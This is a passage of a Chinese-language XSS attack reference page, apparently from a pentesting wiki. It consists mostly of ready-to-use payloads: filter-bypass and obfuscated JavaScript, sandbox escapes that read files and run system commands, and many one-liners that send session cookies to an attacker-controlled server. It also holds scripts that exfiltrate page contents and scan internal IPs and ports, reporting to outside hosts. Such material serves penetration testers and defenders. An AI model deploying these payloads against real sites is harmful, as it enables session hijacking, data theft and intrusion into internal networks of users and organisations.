this[[]+('eva')+(/x/,new Array)+'l'](/xxx.xxx.xxx.xxx.xx/+alert(1),new Array)
globalThis[`al`+/ert/.source]`1`
this[`al`+/ert/.source]`1`
[alert][0].call(this,1)
window['a'+'l'+'e'+'r'+'t']()
window['a'+'l'+'e'+'r'+'t'].call(this,1)
top['a'+'l'+'e'+'r'+'t'].apply(this,[1])
(1,2,3,4,5,6,7,8,alert)(1)
x=alert,x(1)
[1].find(alert)
top["al"+"ert"](1)
top[/al/.source+/ert/.source](1)
al\u0065rt(1)
al\u0065rt`1`
top['al\145rt'](1)
top['al\x65rt'](1)
top[8680439..toString(30)](1)
<svg><animate onbegin=alert() attributeName=x></svg>
````

## **DOM漏洞**

存在使用由攻击者控制的不安全数据的**JS代码**，如`location.href`。攻击者可以利用这一点执行任意JS代码。\
由于对**DOM漏洞的解释进行了扩展**，[**已将其移至此页面**](dom-xss.md)**：**

{% content-ref url="dom-xss.md" %}
[dom-xss.md](dom-xss.md)
{% endcontent-ref %}

在那里，您将找到关于DOM漏洞是什么，它们是如何引发的以及如何利用它们的详细**解释**。\
此外，不要忘记**在上述帖子的末尾**可以找到有关[**DOM篡改攻击**](dom-xss.md#dom-clobbering)的解释。

## 其他绕过方式

### 规范化的Unicode

您可以检查**反射值**是否在服务器（或客户端）中进行了**Unicode规范化**，并利用此功能绕过保护。[**在此处找到一个示例**](../unicode-injection/#xss-cross-site-scripting)。

### PHP FILTER\_VALIDATE\_EMAIL标志绕过

```javascript
"><svg/onload=confirm(1)>"@x.y
```

### Ruby-On-Rails绕过

由于**RoR大量分配**，引号被插入HTML，然后绕过引号限制，可以在标签内添加额外字段（onfocus）。\
表单示例（[来自此报告](https://hackerone.com/reports/709336)），如果发送有效载荷：

```
contact[email] onfocus=javascript:alert('xss') autofocus a=a&form_type[a]aaa
```

配对 "Key","Value" 将会被回显如下：

```
{" onfocus=javascript:alert(&#39;xss&#39;) autofocus a"=>"a"}
```

### 特殊组合

然后，将插入onfocus属性，从而发生XSS。

```markup
<iframe/src="data:text/html,<svg onload=alert(1)>">
<input type=image src onerror="prompt(1)">
<svg onload=alert(1)//
<img src="/" =_=" title="onerror='prompt(1)'">
<img src='1' onerror='alert(0)' <
<script x> alert(1) </script 1=2
<script x>alert('XSS')<script y>
<svg/onload=location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;//
<svg////////onload=alert(1)>
<svg id=x;onload=alert(1)>
<svg id=`x`onload=alert(1)>
<img src=1 alt=al lang=ert onerror=top[alt+lang](0)>
<script>$=1,alert($)</script>
<script ~~~>confirm(1)</script ~~~>
<script>$=1,\u0061lert($)</script>
<</script/script><script>eval('\\u'+'0061'+'lert(1)')//</script>
<</script/script><script ~~~>\u0061lert(1)</script ~~~>
</style></scRipt><scRipt>alert(1)</scRipt>
<img src=x:prompt(eval(alt)) onerror=eval(src) alt=String.fromCharCode(88,83,83)>
<svg><x><script>alert('1'&#41</x>
<iframe src=""/srcdoc='<svg onload=alert(1)>'>
<svg><animate onbegin=alert() attributeName=x></svg>
<img/id="alert('XSS')\"/alt=\"/\"src=\"/\"onerror=eval(id)>
<img src=1 onerror="s=document.createElement('script');s.src='http://xss.rocks/xss.js';document.body.appendChild(s);">
(function(x){this[x+`ert`](1)})`al`
window[`al`+/e/[`ex`+`ec`]`e`+`rt`](2)
document['default'+'View'][`\u0061lert`](3)
```

### 在 302 响应中进行头部注入的 XSS

如果您发现可以在 302 重定向响应中**注入头部**，您可以尝试**让浏览器执行任意 JavaScript**。这并不是**简单的**，因为现代浏览器在 HTTP 响应状态码为 302 时不会解释 HTTP 响应主体，因此仅跨站脚本有效负载是无效的。

在[**这份报告**](https://www.gremwell.com/firefox-xss-302)和[**这篇文章**](https://www.hahwul.com/2020/10/03/forcing-http-redirect-xss/)中，您可以了解如何测试 Location 头中的多个协议，并查看是否有任何协议允许浏览器检查和执行主体内的 XSS 负载。\
已知的协议包括：`mailto://`、`//x:1/`、`ws://`、`wss://`、_空 Location 头_、`resource://`。

### 仅限字母、数字和点号

如果您能指示**回调**将要**执行**的 JavaScript 仅限于这些字符。[**阅读本文的此部分**](./#javascript-function)以了解如何滥用这种行为。

### 有效的 `<script>` 内容类型用于 XSS

(来自[**这里**](https://blog.huli.tw/2022/04/24/en/how-much-do-you-know-about-script-type/)) 如果尝试加载一个带有 `application/octet-stream` 等**内容类型**的脚本，Chrome 将抛出以下错误：

> Refused to execute script from ‘[https://uploader.c.hc.lc/uploads/xxx'](https://uploader.c.hc.lc/uploads/xxx') because its MIME type (‘application/octet-stream’) is not executable, and strict MIME type checking is enabled.

唯一支持 Chrome 运行**加载的脚本**的**内容类型**是位于[https://chromium.googlesource.com/chromium/src.git/+/refs/tags/103.0.5012.1/third\_party/blink/common/mime\_util/mime\_util.cc](https://chromium.googlesource.com/chromium/src.git/+/refs/tags/103.0.5012.1/third\_party/blink/common/mime\_util/mime\_util.cc)中的常量\*\*`kSupportedJavascriptTypes`\*\*。

```c
const char* const kSupportedJavascriptTypes[] = {
"application/ecmascript",
"application/javascript",
"application/x-ecmascript",
"application/x-javascript",
"text/ecmascript",
"text/javascript",
"text/javascript1.0",
"text/javascript1.1",
"text/javascript1.2",
"text/javascript1.3",
"text/javascript1.4",
"text/javascript1.5",
"text/jscript",
"text/livescript",
"text/x-ecmascript",
"text/x-javascript",
};

```

### XSS中的脚本类型

(来源[**这里**](https://blog.huli.tw/2022/04/24/en/how-much-do-you-know-about-script-type/)) 那么，哪些类型可以用来加载脚本呢？

```html
<script type="???"></script>
```

答案是：

* **module**（默认，无需解释）
* [**webbundle**](https://web.dev/web-bundles/): Web Bundles 是一个功能，您可以将一堆数据（HTML、CSS、JS 等）打包到一个 **`.wbn`** 文件中。

```html
<script type="webbundle">
{
"source": "https://example.com/dir/subresources.wbn",
"resources": ["https://example.com/dir/a.js", "https://example.com/dir/b.js", "https://example.com/dir/c.png"]
}
</script>
The resources are loaded from the source .wbn, not accessed via HTTP
```

* [**importmap**](https://github.com/WICG/import-maps)**:** 允许改进导入语法

```html
<script type="importmap">
{
"imports": {
"moment": "/node_modules/moment/src/moment.js",
"lodash": "/node_modules/lodash-es/lodash.js"
}
}
</script>

<!-- With importmap you can do the following -->
<script>
import moment from "moment";
import { partition } from "lodash";
</script>
```

这种行为被用于[**这篇解决方案**](https://github.com/zwade/yaca/tree/master/solution)中，将一个库重新映射到eval上，以滥用它来触发XSS。

* [**speculationrules**](https://github.com/WICG/nav-speculation)**：** 这个功能主要是为了解决预渲染造成的一些问题。它的工作原理如下：

```html
<script type="speculationrules">
{
"prerender": [
{"source": "list",
"urls": ["/page/2"],
"score": 0.5},
{"source": "document",
"if_href_matches": ["https://*.wikipedia.org/**"],
"if_not_selector_matches": [".restricted-section *"],
"score": 0.1}
]
}
</script>
```

### 用于 XSS 的 Web 内容类型

(来源[**这里**](https://blog.huli.tw/2022/04/24/en/how-much-do-you-know-about-script-type/)) 以下内容类型可以在所有浏览器中执行 XSS：

* text/html
* application/xhtml+xml
* application/xml
* text/xml
* image/svg+xml
* text/plain (?? 不在列表中，但我记得在一个 CTF 中看到过)
* application/rss+xml (关闭)
* application/atom+xml (关闭)

在其他浏览器中，其他 **`Content-Types`** 可用于执行任意 JS，请查看：[https://github.com/BlackFan/content-type-research/blob/master/XSS.md](https://github.com/BlackFan/content-type-research/blob/master/XSS.md)

### xml 内容类型

如果页面返回 text/xml 内容类型，则可以指定一个命名空间并执行任意 JS：

```xml
<xml>
<text>hello<img src="1" onerror="alert(1)" xmlns="http://www.w3.org/1999/xhtml" /></text>
</xml>

<!-- Heyes, Gareth. JavaScript for hackers: Learn to think like a hacker (p. 113). Kindle Edition. -->
```

### 特殊替换模式

当类似 **`"some {{template}} data".replace("{{template}}", <user_input>)`** 这样的代码被使用时，攻击者可以使用[**特殊字符串替换**](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global\_Objects/String/replace#specifying\_a\_string\_as\_the\_replacement)来尝试绕过某些保护措施：``"123 {{template}} 456".replace("{{template}}", JSON.stringify({"name": "$'$`alert(1)//"}))``

例如，在[**这篇文章**](https://gitea.nitowa.xyz/nitowa/PlaidCTF-YACA)中，这种方法被用来**转义脚本中的 JSON 字符串**并执行任意代码。

### Chrome缓存到XSS

{% content-ref url="chrome-cache-to-xss.md" %}
[chrome-cache-to-xss.md](chrome-cache-to-xss.md)
{% endcontent-ref %}

### XS Jails逃逸

如果你只能使用有限的字符集，可以查看这些其他有效的 XSJail 问题解决方案：

```javascript
// eval + unescape + regex
eval(unescape(/%2f%0athis%2econstructor%2econstructor(%22return(process%2emainModule%2erequire(%27fs%27)%2ereadFileSync(%27flag%2etxt%27,%27utf8%27))%22)%2f/))()
eval(unescape(1+/1,this%2evalueOf%2econstructor(%22process%2emainModule%2erequire(%27repl%27)%2estart()%22)()%2f/))

// use of with
with(console)log(123)
with(/console.log(1)/)with(this)with(constructor)constructor(source)()
// Just replace console.log(1) to the real code, the code we want to run is:
//return String(process.mainModule.require('fs').readFileSync('flag.txt'))

with(process)with(mainModule)with(require('fs'))return(String(readFileSync('flag.txt')))
with(k='fs',n='flag.txt',process)with(mainModule)with(require(k))return(String(readFileSync(n)))
with(String)with(f=fromCharCode,k=f(102,115),n=f(102,108,97,103,46,116,120,116),process)with(mainModule)with(require(k))return(String(readFileSync(n)))

//Final solution
with(
/with(String)
with(f=fromCharCode,k=f(102,115),n=f(102,108,97,103,46,116,120,116),process)
with(mainModule)
with(require(k))
return(String(readFileSync(n)))
/)
with(this)
with(constructor)
constructor(source)()

// For more uses of with go to challenge misc/CaaSio PSE in
// https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#misc/CaaSio%20PSE
```

如果在执行不受信任的代码之前**一切都是未定义的**（就像在[**这篇文章**](https://blog.huli.tw/2022/02/08/en/what-i-learned-from-dicectf-2022/#miscx2fundefined55-solves)中所述），可以使用以下方法生成有用的对象，从而滥用执行任意不受信任代码的过程：

* 使用 import()

```javascript
// although import "fs" doesn’t work, import('fs') does.
import("fs").then(m=>console.log(m.readFileSync("/flag.txt", "utf8")))
```

* 间接访问 `require`

[根据这个](https://stackoverflow.com/questions/28955047/why-does-a-module-level-return-statement-work-in-node-js/28955050#28955050) 在 Node.js 中，模块被包裹在一个函数内，就像这样：

```javascript
(function (exports, require, module, __filename, __dirname) {
// our actual module code
});
```

因此，如果我们可以从该模块**调用另一个函数**，就可以在该函数中使用`arguments.callee.caller.arguments[1]`来访问\*\*`require`\*\*：

```javascript
(function(){return arguments.callee.caller.arguments[1]("fs").readFileSync("/flag.txt", "utf8")})()
```

以类似的方式，可以使用错误处理程序来访问模块的包装器并获取 `require` 函数：

```javascript
try {
null.f()
} catch (e) {
TypeError = e.constructor
}
Object = {}.constructor
String = ''.constructor
Error = TypeError.prototype.__proto__.constructor
function CustomError() {
const oldStackTrace = Error.prepareStackTrace
try {
Error.prepareStackTrace = (err, structuredStackTrace) => structuredStackTrace
Error.captureStackTrace(this)
this.stack
} finally {
Error.prepareStackTrace = oldStackTrace
}
}
function trigger() {
const err = new CustomError()
console.log(err.stack[0])
for (const x of err.stack) {
// use x.getFunction() to get the upper function, which is the one that Node.js adds a wrapper to, and then use arugments to get the parameter
const fn = x.getFunction()
console.log(String(fn).slice(0, 200))
console.log(fn?.arguments)
console.log('='.repeat(40))
if ((args = fn?.arguments)?.length > 0) {
req = args[1]
console.log(req('child_process').execSync('id').toString())
}
}
}
trigger()
```

### 混淆和高级绕过

* **同一页面中的不同混淆：** [**https://aem1k.com/aurebesh.js/**](https://aem1k.com/aurebesh.js/)
* [https://github.com/aemkei/katakana.js](https://github.com/aemkei/katakana.js)
* [https://ooze.ninja/javascript/poisonjs](https://ooze.ninja/javascript/poisonjs)
* [https://javascriptobfuscator.herokuapp.com/](https://javascriptobfuscator.herokuapp.com)
* [https://skalman.github.io/UglifyJS-online/](https://skalman.github.io/UglifyJS-online/)
* [http://www.jsfuck.com/](http://www.jsfuck.com)
* 更复杂的JSFuck：[https://medium.com/@Master\_SEC/bypass-uppercase-filters-like-a-pro-xss-advanced-methods-daf7a82673ce](https://medium.com/@Master\_SEC/bypass-uppercase-filters-like-a-pro-xss-advanced-methods-daf7a82673ce)
* [http://utf-8.jp/public/jjencode.html](http://utf-8.jp/public/jjencode.html)
* [https://utf-8.jp/public/aaencode.html](https://utf-8.jp/public/aaencode.html)
* [https://portswigger.net/research/the-seventh-way-to-call-a-javascript-function-without-parentheses](https://portswigger.net/research/the-seventh-way-to-call-a-javascript-function-without-parentheses)

```javascript
//Katana
<script>([,ウ,,,,ア]=[]+{},[ネ,ホ,ヌ,セ,,ミ,ハ,ヘ,,,ナ]=[!!ウ]+!ウ+ウ.ウ)[ツ=ア+ウ+ナ+ヘ+ネ+ホ+ヌ+ア+ネ+ウ+ホ][ツ](ミ+ハ+セ+ホ+ネ+'(-~ウ)')()</script>
```

```javascript
//JJencode
<script>$=~[];$={___:++$,$:(![]+"")[$],__$:++$,$_$_:(![]+"")[$],_$_:++$,$_$:({}+"")[$],$_$:($[$]+"")[$],_$:++$,$_:(!""+"")[$],$__:++$,$_$:++$,$__:({}+"")[$],$_:++$,$:++$,$___:++$,$__$:++$};$.$_=($.$_=$+"")[$.$_$]+($._$=$.$_[$.__$])+($.$=($.$+"")[$.__$])+((!$)+"")[$._$]+($.__=$.$_[$.$_])+($.$=(!""+"")[$.__$])+($._=(!""+"")[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$=$.$+(!""+"")[$._$]+$.__+$._+$.$+$.$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$+"\""+$.$_$_+(![]+"")[$._$_]+$.$_+"\\"+$.__$+$.$_+$._$_+$.__+"("+$.___+")"+"\"")())();</script>
```

```javascript
//JSFuck
<script>(+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]]]+[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]])()</script>
```

```javascript
//aaencode
ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻   //*´∇｀*/ ['_']; o=(ﾟｰﾟ)  =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)={ﾟΘﾟ: '_' ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +'_') [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ '_')[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +'_')[ﾟｰﾟ] }; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +'_') [c^_^o];(ﾟДﾟ) ['c'] = ((ﾟДﾟ)+'_') [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) ['o'] = ((ﾟДﾟ)+'_') [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) ['c']+(ﾟДﾟ) ['o']+(ﾟωﾟﾉ +'_')[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +'_') [ﾟｰﾟ] + ((ﾟДﾟ) +'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) ['c']+((ﾟДﾟ)+'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) ['o']+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ];(ﾟДﾟ) ['_'] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+'_') [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +'_') [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟωﾟﾉ +'_') [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]='\\'; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +'_')[c^_^o];(ﾟДﾟ) [ﾟoﾟ]='\"';(ﾟДﾟ) ['_'] ( (ﾟДﾟ) ['_'] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟΘﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟΘﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) ('_');
```

```javascript
// It's also possible to execute JS code only with the chars: []`+!${}
```

## XSS常见有效载荷

### 多个有效载荷合集

{% content-ref url="steal-info-js.md" %}
[steal-info-js.md](steal-info-js.md)
{% endcontent-ref %}

### 检索Cookies

```javascript
<img src=x onerror=this.src="http://<YOUR_SERVER_IP>/?c="+document.cookie>
<img src=x onerror="location.href='http://<YOUR_SERVER_IP>/?c='+ document.cookie">
<script>new Image().src="http://<IP>/?c="+encodeURI(document.cookie);</script>
<script>new Audio().src="http://<IP>/?c="+escape(document.cookie);</script>
<script>location.href = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>location = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>document.location = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>document.location.href = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>document.write('<img src="http://<YOUR_SERVER_IP>?c='+document.cookie+'" />')</script>
<script>window.location.assign('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
<script>window['location']['assign']('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
<script>window['location']['href']('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
<script>document.location=["http://<YOUR_SERVER_IP>?c",document.cookie].join()</script>
<script>var i=new Image();i.src="http://<YOUR_SERVER_IP>/?c="+document.cookie</script>
<script>window.location="https://<SERVER_IP>/?c=".concat(document.cookie)</script>
<script>var xhttp=new XMLHttpRequest();xhttp.open("GET", "http://<SERVER_IP>/?c="%2Bdocument.cookie, true);xhttp.send();</script>
<script>eval(atob('ZG9jdW1lbnQud3JpdGUoIjxpbWcgc3JjPSdodHRwczovLzxTRVJWRVJfSVA+P2M9IisgZG9jdW1lbnQuY29va2llICsiJyAvPiIp'));</script>
<script>fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net', {method: 'POST', mode: 'no-cors', body:document.cookie});</script>
<script>navigator.sendBeacon('https://ssrftest.com/x/AAAAA',document.cookie)</script>
```

{% hint style="info" %}
如果 cookie 中设置了 HTTPOnly 标志，您将**无法从 JavaScript 中访问 cookie**。但是，如果您足够幸运，在这里有[一些绕过此保护的方法](../hacking-with-cookies/#httponly)。
{% endhint %}

### 窃取页面内容

```javascript
var url = "http://10.10.10.25:8000/vac/a1fbf2d1-7c3f-48d2-b0c3-a205e54e09e8";
var attacker = "http://10.10.14.8/exfil";
var xhr  = new XMLHttpRequest();
xhr.onreadystatechange = function() {
if (xhr.readyState == XMLHttpRequest.DONE) {
fetch(attacker + "?" + encodeURI(btoa(xhr.responseText)))
}
}
xhr.open('GET', url, true);
xhr.send(null);
```

### 查找内部IP地址

```html
<script>
var q = []
var collaboratorURL = 'http://5ntrut4mpce548i2yppn9jk1fsli97.burpcollaborator.net';
var wait = 2000
var n_threads = 51

// Prepare the fetchUrl functions to access all the possible
for(i=1;i<=255;i++){
q.push(
function(url){
return function(){
fetchUrl(url, wait);
}
}('http://192.168.0.'+i+':8080'));
}

// Launch n_threads threads that are going to be calling fetchUrl until there is no more functions in q
for(i=1; i<=n_threads; i++){
if(q.length) q.shift()();
}

function fetchUrl(url, wait){
console.log(url)
var controller = new AbortController(), signal = controller.signal;
fetch(url, {signal}).then(r=>r.text().then(text=>
{
location = collaboratorURL + '?ip='+url.replace(/^http:\/\//,'')+'&code='+encodeURIComponent(text)+'&'+Date.now()
}
))
.catch(e => {
if(!String(e).includes("The user aborted a request") && q.length) {
q.shift()();
}
});

setTimeout(x=>{
controller.abort();
if(q.length) {
q.shift()();
}
}, wait);
}
</script>
```

### 端口扫描器 (fetch)

```javascript
const checkPort = (port) => { fetch(http://localhost:${port}, { mode: "no-cors" }).then(() => { let img = document.createElement("img"); img.src = http://attacker.com/ping?port=${port}; }); } for(let i=0; i<1000; i++) { checkPort(i); }
```

### 端口扫描器（Websockets）

```python
var ports = [80, 443, 445, 554, 3306, 3690, 1234];
for(var i=0; i<ports.length; i++) {
var s = new WebSocket("wss://192.168.1.1:" + ports[i]);
s.start = performance.now();
s.port = ports[i];
s.onerror = function() {
